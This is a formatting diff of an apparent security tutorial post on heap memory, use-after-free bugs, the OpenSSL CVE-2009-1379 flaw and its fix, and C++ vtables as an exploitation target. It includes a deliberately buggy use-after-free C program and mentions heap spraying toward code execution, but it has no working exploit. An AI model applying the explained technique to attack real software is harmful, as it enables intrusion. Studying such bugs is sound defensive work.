+Stack allocations are done when variables are stored directly to memory . <br/>
+<br/>
+For example:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">PHP Code:</div>
-	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
-<span style="color: #0000BB">void&nbsp;f</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">true</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">int&nbsp;b&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">b&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />}&nbsp;<br /></span><span style="color: #0000BB"></span>
+	<div class="bbcode_code" style="height:108px;"><code><code><span style="color: #000000">
+<span style="color: #0000BB">void f</span><span style="color: #007700">()<br/>{<br/>    if(</span><span style="color: #0000BB">true</span><span style="color: #007700">) {<br/>        </span><span style="color: #0000BB">int b </span><span style="color: #007700">= </span><span style="color: #0000BB">0</span><span style="color: #007700">;<br/>    }<br/>    </span><span style="color: #0000BB">b </span><span style="color: #007700">= </span><span style="color: #0000BB">1</span><span style="color: #007700">;<br/>} 
+<br/></span><span style="color: #0000BB"></span>
 </span>
 </code></code></div>
-</div>Here value of &quot;b&quot; is already declared and know so &quot;int b&quot; is allocated on the stack. <br />
-*b is not available outside the if  { } block, so the above program would have compilation issues. <br />
-<br />
-<b>Heap :<br />
-</b>So considering the above if we need to handle memmory dynamically ,thats where Heap comes into picture. Heap overtakes the disability of stack, it's is the segment where dynamic memory allocation usually takes place. <br />
-Unlike stack memmory allocations[LIFO] the term &quot;heap memory allocations&quot; is unrelated to heap data structure. It's basically a linked list of used and free blocks. When a request for memory is made by functions like (new,malloc,GlobalAlloc,LocalAlloc, malloc,HeapAlloc,RtlAllocateHeap etc) they are satis&#64257;ed by providing a suitable block from one of the free blocks. This requires updating list of blocks on the heap [Heap Management ]. This meta information about the blocks on the heap is also stored on the heap often in a small area just in front of every block .The various OS implementation of heap management functions make use of these meta info when allocating and freeing heap. And the many heap based exploits out there make use of these heap management structures to achieve code execution by feeding them with malformed data.  <br />
-Note: Heap overflow and [Dangling pointer, Use after free bugs] are two diff things. <br />
-<br />
-<img src="attachmentf040.jpg?attachmentid=556&amp;d=1352974751" border="0" alt=""  style="float: CONFIG" /><br />
-<br />
-<b>Bulletins</b>: <br />
-<br />
- � The heap size is predefined at application startup but can grow as per required.<br />
-<br />
-� You would use the heap if you don�t know exactly how much data you will need at runtime or if you need to allocate a lot of data.<br />
-<br />
-� Responsible for memory leak, you need to free the unused memory manually.<br />
-<br />
-� You need to manually free memory onces it is no more in use and that should never fall out of scope. The data is freed with GlobalFree , LocalFree, delete[] free etc functions .<br />
-<br />
-� Can have allocation failures if too big of a bu&#64256;er is requested to be allocated.<br />
-<br />
-� All shared libraries and dynamically loaded modules in a process could access the heap. This same reason why you can do heap spraying on a browser using any loaded modules example: flash,java script ,vbs etc. <br />
-<br />
-<a href="../external.html?link=http://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap/1213360#1213360" target="_blank">memory management - What and where are the stack and heap? - Stack Overflow</a><br />
-<br />
-<b><u>Example Program Demonstrating memory allocations. <br />
+</div>Here value of "b" is already declared and know so "int b" is allocated on the stack. <br/>
+*b is not available outside the if  { } block, so the above program would have compilation issues. <br/>
+<br/>
+<b>Heap :<br/>
+</b>So considering the above if we need to handle memmory dynamically ,thats where Heap comes into picture. Heap overtakes the disability of stack, it's is the segment where dynamic memory allocation usually takes place. <br/>
+Unlike stack memmory allocations[LIFO] the term "heap memory allocations" is unrelated to heap data structure. It's basically a linked list of used and free blocks. When a request for memory is made by functions like (new,malloc,GlobalAlloc,LocalAlloc, malloc,HeapAlloc,RtlAllocateHeap etc) they are satisﬁed by providing a suitable block from one of the free blocks. This requires updating list of blocks on the heap [Heap Management ]. This meta information about the blocks on the heap is also stored on the heap often in a small area just in front of every block .The various OS implementation of heap management functions make use of these meta info when allocating and freeing heap. And the many heap based exploits out there make use of these heap management structures to achieve code execution by feeding them with malformed data.  <br/>
+Note: Heap overflow and [Dangling pointer, Use after free bugs] are two diff things. <br/>
+<br/>
+<img alt="" border="0" src="attachmentf040.jpg?attachmentid=556&amp;d=1352974751" style="float: CONFIG"/><br/>
+<br/>
+<b>Bulletins</b>: <br/>
+<br/>
+ • The heap size is predefined at application startup but can grow as per required.<br/>
+<br/>
+• You would use the heap if you don’t know exactly how much data you will need at runtime or if you need to allocate a lot of data.<br/>
+<br/>
+• Responsible for memory leak, you need to free the unused memory manually.<br/>
+<br/>
+• You need to manually free memory onces it is no more in use and that should never fall out of scope. The data is freed with GlobalFree , LocalFree, delete[] free etc functions .<br/>
+<br/>
+• Can have allocation failures if too big of a buﬀer is requested to be allocated.<br/>
+<br/>
+• All shared libraries and dynamically loaded modules in a process could access the heap. This same reason why you can do heap spraying on a browser using any loaded modules example: flash,java script ,vbs etc. <br/>
+<br/>
+<a href="../external.html?link=http://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap/1213360#1213360" target="_blank">memory management - What and where are the stack and heap? - Stack Overflow</a><br/>
+<br/>
+<b><u>Example Program Demonstrating memory allocations. <br/>
 </u></b><div class="bbcode_container">
 	<div class="bbcode_description">PHP Code:</div>
-	<div class="bbcode_code"style="height:336px;"><code><code><span style="color: #000000">
-<span style="color: #0000BB"><br />int&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">x</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Uninitialized&nbsp;variable&nbsp;stored&nbsp;in&nbsp;bss*/<br /></span><span style="color: #0000BB">int&nbsp;w</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Uninitialized&nbsp;variable&nbsp;stored&nbsp;in&nbsp;bss*/<br /></span><span style="color: #0000BB">int&nbsp;y&nbsp;</span><span style="color: #007700">=</span><span style="color: #0000BB">10&nbsp;</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Initialized&nbsp;variable&nbsp;stored&nbsp;in&nbsp;DSS*/<br /></span><span style="color: #0000BB">void&nbsp;b</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">1</span><span style="color: #007700">==</span><span style="color: #0000BB">1</span><span style="color: #007700">)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">x&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">malloc</span><span style="color: #007700">(</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(int));&nbsp;</span><span style="color: #FF8000">/*&nbsp;Memmory&nbsp;allocated&nbsp;in&nbsp;Heap&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*memory&nbsp;not&nbsp;freed&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">}<br />&nbsp;&nbsp;<br />}<br /><br /></span><span style="color: #0000BB">void&nbsp;c</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">free</span><span style="color: #007700">(</span><span style="color: #0000BB">x</span><span style="color: #007700">);&nbsp;</span><span style="color: #FF8000">/*&nbsp;Memory&nbsp;Freed&nbsp;*/<br /></span><span style="color: #007700">}&nbsp;<br /></span><span style="color: #0000BB">int&nbsp;main</span><span style="color: #007700">(</span><span style="color: #0000BB">void</span><span style="color: #007700">)<br />{&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;static&nbsp;</span><span style="color: #0000BB">int&nbsp;f&nbsp;</span><span style="color: #007700">=</span><span style="color: #0000BB">10&nbsp;&nbsp;</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Initialized&nbsp;static&nbsp;variable&nbsp;stored&nbsp;in&nbsp;DS&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">static&nbsp;</span><span style="color: #0000BB">int&nbsp;i</span><span style="color: #007700">;&nbsp;</span><span style="color: #FF8000">/*&nbsp;Uninitialized&nbsp;static&nbsp;variable&nbsp;stored&nbsp;in&nbsp;bss&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">b</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">c</span><span style="color: #007700">();<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />}&nbsp;<br /></span><span style="color: #0000BB"></span>
+	<div class="bbcode_code" style="height:336px;"><code><code><span style="color: #000000">
+<span style="color: #0000BB"><br/>int </span><span style="color: #007700">*</span><span style="color: #0000BB">x</span><span style="color: #007700">; </span><span style="color: #FF8000">/* Uninitialized variable stored in bss*/<br/></span><span style="color: #0000BB">int w</span><span style="color: #007700">; </span><span style="color: #FF8000">/* Uninitialized variable stored in bss*/<br/></span><span style="color: #0000BB">int y </span><span style="color: #007700">=</span><span style="color: #0000BB">10 </span><span style="color: #007700">; </span><span style="color: #FF8000">/* Initialized variable stored in DSS*/<br/></span><span style="color: #0000BB">void b</span><span style="color: #007700">()<br/>{<br/>    if(</span><span style="color: #0000BB">1</span><span style="color: #007700">==</span><span style="color: #0000BB">1</span><span style="color: #007700">) <br/>    {<br/>        </span><span style="color: #0000BB">x </span><span style="color: #007700">= </span><span style="color: #0000BB">malloc</span><span style="color: #007700">(</span><span style="color: #0000BB">sizeof</span><span style="color: #007700">(int)); </span><span style="color: #FF8000">/* Memmory allocated in Heap */<br/>        /*memory not freed */<br/>    </span><span style="color: #007700">}<br/>  <br/>}<br/><br/></span><span style="color: #0000BB">void c</span><span style="color: #007700">()<br/>{<br/>    </span><span style="color: #0000BB">free</span><span style="color: #007700">(</span><span style="color: #0000BB">x</span><span style="color: #007700">); </span><span style="color: #FF8000">/* Memory Freed */<br/></span><span style="color: #007700">} <br/></span><span style="color: #0000BB">int main</span><span style="color: #007700">(</span><span style="color: #0000BB">void</span><span style="color: #007700">)<br/>{   <br/>    static </span><span style="color: #0000BB">int f </span><span style="color: #007700">=</span><span style="color: #0000BB">10  </span><span style="color: #007700">; </span><span style="color: #FF8000">/* Initialized static variable stored in DS */<br/>    </span><span style="color: #007700">static </span><span style="color: #0000BB">int i</span><span style="color: #007700">; </span><span style="color: #FF8000">/* Uninitialized static variable stored in bss */<br/>    </span><span style="color: #0000BB">b</span><span style="color: #007700">();<br/>    </span><span style="color: #0000BB">c</span><span style="color: #007700">();<br/>    return </span><span style="color: #0000BB">0</span><span style="color: #007700">;<br/>} 
+<br/></span><span style="color: #0000BB"></span>
 </span>
 </code></code></div>
-</div><a href="../external.html?link=http://www.geeksforgeeks.org/archives/14268" target="_blank">http://www.geeksforgeeks.org/archives/14268</a><br />
-<br />
-In short large variables of arrays whose size may vary, heap memory allocation is used. So heap related security issues occur when<br />
-1) Not freeing all of the memory allocated ending up with memory leaks.<br />
-2)Using of already released memory would lead to Use after free security issues.<br />
-3) Double freeing memory would cause memory corruptions . <br />
-<br />
-<br />
-<u><b><font color="#3E3E3E">Use after free issues and example buggy codes.<br />
-</font></b></u>[I]#dangling pointers #use after free #double free<br />
-<br />
-<i><u>Example Buggy program:<br />
-</u></i><br />
+</div><a href="../external.html?link=http://www.geeksforgeeks.org/archives/14268" target="_blank">http://www.geeksforgeeks.org/archives/14268</a><br/>
+<br/>
+In short large variables of arrays whose size may vary, heap memory allocation is used. So heap related security issues occur when<br/>
+1) Not freeing all of the memory allocated ending up with memory leaks.<br/>
+2)Using of already released memory would lead to Use after free security issues.<br/>
+3) Double freeing memory would cause memory corruptions . <br/>
+<br/>
+<br/>
+<u><b><font color="#3E3E3E">Use after free issues and example buggy codes.<br/>
+</font></b></u>[I]#dangling pointers #use after free #double free<br/>
+<br/>
+<i><u>Example Buggy program:<br/>
+</u></i><br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:204px;">int main(void)
+	<pre class="bbcode_code" style="height:204px;">int main(void)
 {   
 char *ch_ptr = malloc(100);
 int i;
@@ -771,68 +766,69 @@ for (i = 0; i &lt; 99; i++)
 {
 ch_ptr<i> = 'A';
 free(ch_ptr);
-printf(&quot;%s\n&quot;, ch_ptr);
+printf("%s\n", ch_ptr);
 
 }
 
 }
 
 </i></pre>
-</div><i><br />
-<br />
-Here at line 3 char_ptr is allocated a 100 bytes heap and later inside the for loop at line 8 the heap is deallocated.  And at line 9 the de referenced pointer is called again. So this will trigger a memory corruption as follows.<br />
-<br />
-<img src="attachmentd1bb.jpg?attachmentid=559&amp;d=1352974751" border="0" alt=""  style="float: CONFIG" /><br />
-<br />
-So the exploitation goes based on the nature of the crash, we will dig into the exploitation methods later.<br />
-<br />
-<br />
-<b>A Live example:</b><br />
-<br />
-For demonstration a good and easy to understand bug would be the CVE-2009-1379 OpenSSL from 0.9.8 to 0.9.8k use after free bug. <br />
-</i><br />
-<br />
-<u>The buggy code:<br />
-<img src="attachment47fc.jpg?attachmentid=560&amp;d=1352974751" border="0" alt=""  style="float: CONFIG" /><br />
-</u><a href="../external.html?link=https://bugzilla.redhat.com/attachment.cgi?id=344671&amp;action=diff" target="_blank">https://bugzilla.redhat.com/attachme...71&amp;action=diff</a><br />
-<u><font color="#0000ff">The Bug:<br />
-</font></u><br />
-al is initilized at line 424 to &amp;frag-&gt;msg_header and at line 533 it's freed using dtls1_hm_fragment_free(frag); and at line 536  if the following condition satisfies &quot;(if al=0)&quot; then program will try to access &quot;frag&quot; line 539 which was freed at line 533. So this will cause an invalid read operation , possibly crashing the app, and if we are some how able to control the adress that its reading form [heap spray!! or what ever], then we would be able to achieve code execution. <br />
-<br />
-<br />
-<font color="#0000ff">The Fix:<br />
-</font>The simple fix to this was to add a temporary variable at line 533 &quot;<font color="#000000"><span style="font-family: monospace">frag_len = frag-&gt;msg_header.frag_len;</span></font><font color="#000000"><span style="font-family: monospace">&quot;</span></font> holding frag-&gt;msg_header.frag_len. And later return frag_len instead of the freed object.  <br />
-<br />
-<u><b>Fuzzing for Use After Free and Fuzzers <br />
-</b></u><br />
-<br />
-*We will have another blog post for this some time later. <br />
-<br />
-<b><u>Exploiting Use after free bugs.<br />
-</u></b><br />
-<u>C++ Virtual Functions :</u><br />
-<br />
-C++ matches a correct function call based on the type of the object at runtime. This is called dynamic binding and this is done by using the keyword <i>&quot;virtual&quot;</i>. The virtual keyword instructs the compiler that it should choose the right function based on the object it's reference referred to rather than the type. These objects that are referred by virtual functions points to a virtual table VFTABLE[Virtual Function Table] . It's where all the virtual functions adress are stored. It would be the first DWORD in the object memory. <br />
-<br />
-<img src="attachmentaba5.jpg?attachmentid=561&amp;d=1352974751" border="0" alt=""  style="float: CONFIG" /><br />
-Image Source:<a href="../www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">http://www.blackhat.com/presentation...07-afek-WP.pdf</a> <br />
-<br />
-<br />
-Example Program:<br />
-<br />
+</div><i><br/>
+<br/>
+Here at line 3 char_ptr is allocated a 100 bytes heap and later inside the for loop at line 8 the heap is deallocated.  And at line 9 the de referenced pointer is called again. So this will trigger a memory corruption as follows.<br/>
+<br/>
+<img alt="" border="0" src="attachmentd1bb.jpg?attachmentid=559&amp;d=1352974751" style="float: CONFIG"/><br/>
+<br/>
+So the exploitation goes based on the nature of the crash, we will dig into the exploitation methods later.<br/>
+<br/>
+<br/>
+<b>A Live example:</b><br/>
+<br/>
+For demonstration a good and easy to understand bug would be the CVE-2009-1379 OpenSSL from 0.9.8 to 0.9.8k use after free bug. <br/>
+</i><br/>
+<br/>
+<u>The buggy code:<br/>
+<img alt="" border="0" src="attachment47fc.jpg?attachmentid=560&amp;d=1352974751" style="float: CONFIG"/><br/>
+</u><a href="../external.html?link=https://bugzilla.redhat.com/attachment.cgi?id=344671&amp;action=diff" target="_blank">https://bugzilla.redhat.com/attachme...71&amp;action=diff</a><br/>
+<u><font color="#0000ff">The Bug:<br/>
+</font></u><br/>
+al is initilized at line 424 to &amp;frag-&gt;msg_header and at line 533 it's freed using dtls1_hm_fragment_free(frag); and at line 536  if the following condition satisfies "(if al=0)" then program will try to access "frag" line 539 which was freed at line 533. So this will cause an invalid read operation , possibly crashing the app, and if we are some how able to control the adress that its reading form [heap spray!! or what ever], then we would be able to achieve code execution. <br/>
+<br/>
+<br/>
+<font color="#0000ff">The Fix:<br/>
+</font>The simple fix to this was to add a temporary variable at line 533 "<font color="#000000"><span style="font-family: monospace">frag_len = frag-&gt;msg_header.frag_len;</span></font><font color="#000000"><span style="font-family: monospace">"</span></font> holding frag-&gt;msg_header.frag_len. And later return frag_len instead of the freed object.  <br/>
+<br/>
+<u><b>Fuzzing for Use After Free and Fuzzers <br/>
+</b></u><br/>
+<br/>
+*We will have another blog post for this some time later. <br/>
+<br/>
+<b><u>Exploiting Use after free bugs.<br/>
+</u></b><br/>
+<u>C++ Virtual Functions :</u><br/>
+<br/>
+C++ matches a correct function call based on the type of the object at runtime. This is called dynamic binding and this is done by using the keyword <i>"virtual"</i>. The virtual keyword instructs the compiler that it should choose the right function based on the object it's reference referred to rather than the type. These objects that are referred by virtual functions points to a virtual table VFTABLE[Virtual Function Table] . It's where all the virtual functions adress are stored. It would be the first DWORD in the object memory. <br/>
+<br/>
+<img alt="" border="0" src="attachmentaba5.jpg?attachmentid=561&amp;d=1352974751" style="float: CONFIG"/><br/>
+Image Source:<a href="../www.blackhat.com/presentations/bh-usa-07/Afek/Whitepaper/bh-usa-07-afek-WP.pdf" target="_blank">http://www.blackhat.com/presentation...07-afek-WP.pdf</a> <br/>
+<br/>
+<br/>
+Example Program:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">PHP Code:</div>
-	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
-<span style="color: #0000BB"></span><span style="color: #FF8000">#include&lt;iostream&gt;<br /></span><span style="color: #0000BB">using&nbsp;</span><span style="color: #007700">namespace&nbsp;</span><span style="color: #0000BB">std</span><span style="color: #007700">;<br /><br />class&nbsp;</span><span style="color: #0000BB">Test<br /></span><span style="color: #007700">{<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;:<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">virtual&nbsp;void&nbsp;Show</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cout</span><span style="color: #007700">&lt;&lt;</span><span style="color: #DD0000">"I&nbsp;am&nbsp;in&nbsp;Test&nbsp;Class"</span><span style="color: #007700">&lt;&lt;</span><span style="color: #0000BB">endl</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />};<br /><br />class&nbsp;</span><span style="color: #0000BB">Test1&nbsp;</span><span style="color: #007700">:&nbsp;public&nbsp;</span><span style="color: #0000BB">Test<br /></span><span style="color: #007700">{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">virtual&nbsp;void&nbsp;Show</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cout</span><span style="color: #007700">&lt;&lt;</span><span style="color: #DD0000">"I&nbsp;am&nbsp;in&nbsp;Test1&nbsp;Class"</span><span style="color: #007700">&lt;&lt;</span><span style="color: #0000BB">endl</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />};<br /><br /></span><span style="color: #0000BB">int&nbsp;main</span><span style="color: #007700">()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Test&nbsp;</span><span style="color: #007700">*</span><span style="color: #0000BB">Obj</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Test&nbsp;Obj1</span><span style="color: #007700">;&nbsp;&nbsp;&nbsp;</span><span style="color: #FF8000">//&nbsp;Base&nbsp;Class&nbsp;Object<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Test1&nbsp;Obj2</span><span style="color: #007700">;&nbsp;&nbsp;</span><span style="color: #FF8000">//Derived&nbsp;Class&nbsp;Object<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Obj&nbsp;</span><span style="color: #007700">=&nbsp;&amp;</span><span style="color: #0000BB">Obj2</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Obj</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Show</span><span style="color: #007700">();&nbsp;&nbsp;</span><span style="color: #FF8000">//In&nbsp;this&nbsp;case&nbsp;derived&nbsp;class&nbsp;show&nbsp;function&nbsp;called.<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Obj&nbsp;</span><span style="color: #007700">=&nbsp;&amp;</span><span style="color: #0000BB">Obj1</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Obj</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Show</span><span style="color: #007700">();&nbsp;</span><span style="color: #FF8000">//In&nbsp;this&nbsp;case&nbsp;Base&nbsp;class&nbsp;show&nbsp;function&nbsp;called.<br /></span><span style="color: #007700">}<br /><br />&#91;</span><span style="color: #0000BB">B</span><span style="color: #007700">&#93;And&nbsp;</span><span style="color: #0000BB">the&nbsp;output&nbsp;is&nbsp;</span><span style="color: #007700">:&#91;/</span><span style="color: #0000BB">B</span><span style="color: #007700">&#93;<br /><br />&#91;</span><span style="color: #0000BB">CODE</span><span style="color: #007700">&#93;</span><span style="color: #0000BB">I&nbsp;am&nbsp;in&nbsp;Test1&nbsp;</span><span style="color: #007700">Class<br /></span><span style="color: #0000BB">I&nbsp;am&nbsp;in&nbsp;Test&nbsp;</span><span style="color: #007700">Class&#91;/</span><span style="color: #0000BB">CODE</span><span style="color: #007700">&#93;&nbsp;<br /></span><span style="color: #0000BB"></span>
+	<div class="bbcode_code" style="height:372px;"><code><code><span style="color: #000000">
+<span style="color: #0000BB"></span><span style="color: #FF8000">#include&lt;iostream&gt;<br/></span><span style="color: #0000BB">using </span><span style="color: #007700">namespace </span><span style="color: #0000BB">std</span><span style="color: #007700">;<br/><br/>class </span><span style="color: #0000BB">Test<br/></span><span style="color: #007700">{<br/>    public :<br/><br/>        </span><span style="color: #0000BB">virtual void Show</span><span style="color: #007700">()<br/>        {<br/>            </span><span style="color: #0000BB">cout</span><span style="color: #007700">&lt;&lt;</span><span style="color: #DD0000">"I am in Test Class"</span><span style="color: #007700">&lt;&lt;</span><span style="color: #0000BB">endl</span><span style="color: #007700">;<br/>        }<br/>};<br/><br/>class </span><span style="color: #0000BB">Test1 </span><span style="color: #007700">: public </span><span style="color: #0000BB">Test<br/></span><span style="color: #007700">{<br/>      public:<br/>           </span><span style="color: #0000BB">virtual void Show</span><span style="color: #007700">()<br/>           {<br/>            </span><span style="color: #0000BB">cout</span><span style="color: #007700">&lt;&lt;</span><span style="color: #DD0000">"I am in Test1 Class"</span><span style="color: #007700">&lt;&lt;</span><span style="color: #0000BB">endl</span><span style="color: #007700">;<br/>           }<br/><br/>};<br/><br/></span><span style="color: #0000BB">int main</span><span style="color: #007700">()<br/>{<br/>    </span><span style="color: #0000BB">Test </span><span style="color: #007700">*</span><span style="color: #0000BB">Obj</span><span style="color: #007700">;<br/><br/>    </span><span style="color: #0000BB">Test Obj1</span><span style="color: #007700">;   </span><span style="color: #FF8000">// Base Class Object<br/><br/>    </span><span style="color: #0000BB">Test1 Obj2</span><span style="color: #007700">;  </span><span style="color: #FF8000">//Derived Class Object<br/><br/>    </span><span style="color: #0000BB">Obj </span><span style="color: #007700">= &amp;</span><span style="color: #0000BB">Obj2</span><span style="color: #007700">;<br/><br/>    </span><span style="color: #0000BB">Obj</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Show</span><span style="color: #007700">();  </span><span style="color: #FF8000">//In this case derived class show function called.<br/><br/>    </span><span style="color: #0000BB">Obj </span><span style="color: #007700">= &amp;</span><span style="color: #0000BB">Obj1</span><span style="color: #007700">;<br/><br/>    </span><span style="color: #0000BB">Obj</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Show</span><span style="color: #007700">(); </span><span style="color: #FF8000">//In this case Base class show function called.<br/></span><span style="color: #007700">}<br/><br/>[</span><span style="color: #0000BB">B</span><span style="color: #007700">]And </span><span style="color: #0000BB">the output is </span><span style="color: #007700">:[/</span><span style="color: #0000BB">B</span><span style="color: #007700">]<br/><br/>[</span><span style="color: #0000BB">CODE</span><span style="color: #007700">]</span><span style="color: #0000BB">I am in Test1 </span><span style="color: #007700">Class<br/></span><span style="color: #0000BB">I am in Test </span><span style="color: #007700">Class[/</span><span style="color: #0000BB">CODE</span><span style="color: #007700">] 
+<br/></span><span style="color: #0000BB"></span>
 </span>
 </code></code></div>
-</div><a href="../external.html?link=http://www.go4expert.com/forums/showthread.php?t=5495" target="_blank">Virtual Functions in C++</a><br />
-<a href="../external.html?link=http://publib.boulder.ibm.com/infocenter/lnxpcomp/v8v101/index.jsp?topic=%2Fcom.ibm.xlcpp8l.doc%2Flanguage%2Fref%2Fcplr139.htm" target="_blank">IBM Linux Compilers</a><br />
-<br />
-The above program will have the following vftable structure. <br />
+</div><a href="../external.html?link=http://www.go4expert.com/forums/showthread.php?t=5495" target="_blank">Virtual Functions in C++</a><br/>
+<a href="../external.html?link=http://publib.boulder.ibm.com/infocenter/lnxpcomp/v8v101/index.jsp?topic=%2Fcom.ibm.xlcpp8l.doc%2Flanguage%2Fref%2Fcplr139.htm" target="_blank">IBM Linux Compilers</a><br/>
+<br/>
+The above program will have the following vftable structure. <br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:252px;"><font color="#800000">Class Test size(8):</font>
+	<pre class="bbcode_code" style="height:252px;"><font color="#800000">Class Test size(8):</font>
       <font color="#800000">+---
       |{vfptr}
       +---
@@ -851,13 +847,12 @@ Class Test1 size(8):
       +--
       | {vfptr}
       | &amp;test1::Show</font></pre>
-</div><img src="attachment72fc.jpg?attachmentid=558&amp;d=1352974751" border="0" alt=""  style="float: CONFIG" /><br />
-<br />
-<br />
+</div><img alt="" border="0" src="attachment72fc.jpg?attachmentid=558&amp;d=1352974751" style="float: CONFIG"/><br/>
+<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:372px;">
-
+	<pre class="bbcode_code" style="height:372px;">
 004013D0  |. 8D45 C8        LEA EAX,DWORD PTR SS:[EBP-38]
 004013D3  |. 8945 F4        MOV DWORD PTR SS:[EBP-C],EAX
 004013D6  |. 8B45 F4        MOV EAX,DWORD PTR SS:[EBP-C]
@@ -868,9 +863,9 @@ Class Test1 size(8):
 <b>004013E3  |. FFD0           CALL EAX
 </b>
 
-<font color="#0000ff">Here EAX point to the Virtual Function table which point to calls the &quot;Test1&quot; 
+<font color="#0000ff">Here EAX point to the Virtual Function table which point to calls the "Test1" 
 </font>
-004013E5  |. C70424 0000440&gt;MOV DWORD PTR SS:[ESP],vfunc.00440000                  ; |ASCII &quot;pause&quot;
+004013E5  |. C70424 0000440&gt;MOV DWORD PTR SS:[ESP],vfunc.00440000                  ; |ASCII "pause"
 004013EC  |. E8 AFF20000    CALL &lt;JMP.&amp;msvcrt.system&gt;                              ; \system
 004013F1  |. 8D45 D8        LEA EAX,DWORD PTR SS:[EBP-28]
 004013F4  |. 8945 F4        MOV DWORD PTR SS:[EBP-C],EAX
@@ -880,19 +875,19 @@ Class Test1 size(8):
 004013FF  |. 890424         MOV DWORD PTR SS:[ESP],EAX
 00401402  |. 8B02           MOV EAX,DWORD PTR DS:[EDX]
 <b>00401404  |. FFD0           CALL EAX
-</b><font color="#0000ff">Here EAX point to the Virtual Function table and calls the &quot;Test&quot; class
+</b><font color="#0000ff">Here EAX point to the Virtual Function table and calls the "Test" class
 
 
-</font>00401406  |. C70424 0000440&gt;MOV DWORD PTR SS:[ESP],vfunc.00440000                  ; |ASCII &quot;pause&quot;
+</font>00401406  |. C70424 0000440&gt;MOV DWORD PTR SS:[ESP],vfunc.00440000                  ; |ASCII "pause"
